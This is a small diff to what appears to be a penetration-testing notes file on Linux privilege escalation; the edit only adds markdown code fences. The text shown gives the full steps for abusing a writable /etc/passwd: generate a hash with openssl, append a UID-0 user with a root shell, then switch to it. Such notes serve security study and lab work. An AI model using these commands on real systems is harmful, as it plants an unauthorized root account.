@@ -26,8 +26,8 @@ If we see a SETENV in that case we need to -
 -----------------------------------------------------       
 
 if you have read/write access to /etc/passwd you can:
-    openssl passwd whateverPasswordYouWant
+    ```openssl passwd whateverPasswordYouWant
     echo "myUser:hashFromAboveCommand:0:0:root:/root:/bin/bash" >> /etc/passwd
-    su myUser
+    su myUser```
          
    
